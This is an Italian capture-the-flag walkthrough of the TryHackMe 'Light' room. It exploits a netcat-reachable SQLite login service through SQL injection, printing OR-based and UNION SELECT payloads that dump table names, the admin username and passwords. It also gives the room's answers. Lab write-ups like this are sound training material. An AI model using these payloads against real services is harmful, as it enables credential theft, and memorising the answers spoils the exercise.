
#tryhackmelabs #laboratorio #sqlinjection 

https://tryhackme.com/r/room/lightroom

Sto lavorando su un'applicazione di database chiamata Light! Vuoi provarla?  
Se sì, l'applicazione è in esecuzione sulla **porta 1337.** Puoi connetterti ad essa tramite `nc 10.10.38.154 1337`  
Puoi usare il nome utente `smokey`per iniziare.

```
nmap -Pn -sV -O --open -p- 10.10.38.154   
```
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
1337/tcp open  waste?
```

```
nc 10.10.38.154 1337
```
```
smokey
```

```
nc 10.10.38.154 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```
viene restituita la password associata al nome utente.
```
vYQ5ngPpw8AdUmL
```

Per trovare il nome utente dell'amministratore, dobbiamo usare SQL injection

```
smokey'
```
	 aggiungi un apostrofo dopo la richiesta ,solitamente è sufficiente a causare un errore del server quando è presente un semplice SQLi

```
nc 10.10.38.154 1337
Welcome to the Light database!
Error: unrecognized token: "'smokey'' LIMIT 30"
Please enter your username: 
```

```
smokey' OR '1'='1
```
Password: tF8tj2o94WE4LKC

```
smokey' Union Select name FROM sqlite_master WHERE type='table
```
- **Restituisce i Nomi delle Tabelle**: La query restituirà un elenco di tutti i nomi delle tabelle presenti nel database SQLite. Questo è utile per esplorare la struttura del database e vedere quali tabelle sono disponibili per ulteriori interrogazioni.
```
admintable
```

```
smokey' Union Select password FROM admintable WHERE username='smokey
```
```
Password: vYQ5ngPpw8AdUmL
```

```
smokey' Union Select username FROM admintable WHERE username like '%
```
	`WHERE username LIKE '%'`**: Questa condizione filtra i risultati per includere solo i nomi utente che corrispondono al pattern specificato. L'uso di `LIKE '%'` significa che stai cercando tutti i nomi utente, poiché il simbolo `%` rappresenta qualsiasi sequenza di caratteri.

Qual è il nome utente amministratore?
```
TryHackMeAdmin
```

```
smokey' Union Select password FROM admintable WHERE username='TryHackMeAdmin
```
```
Password: mamZtAuMlrsEy5bp6q17
```

```
ssh TryHackMeAdmin@10.10.100.45
```
Qual è la password del nome utente menzionato nella domanda 1?
```
mamZtAuMlrsEy5bp6q17
```

Qual'è la bandiera?

```
smokey' Union Select COUNT(username) FROM admintable WHERE '1
```
Password: 2
ci sono due utenti
```
smokey' Union Select username FROM admintable WHERE username !='TryHackMeAdmin
```
	`WHERE username != 'TryHackMeAdmin'`**: Questa condizione filtra i risultati per includere solo i nomi utente che **non** corrispondono a `'TryHackMeAdmin'`. Quindi, la query restituirebbe tutti i nomi utente dalla tabella `admintable`, eccetto quello specificato.
	
```
Password: flag
```
	è il nome dell'altro user
	
```
smokey' Union Select password FROM admintable WHERE username='flag
```
```
Password: THM{xxxxxxxxxxxxx}
```


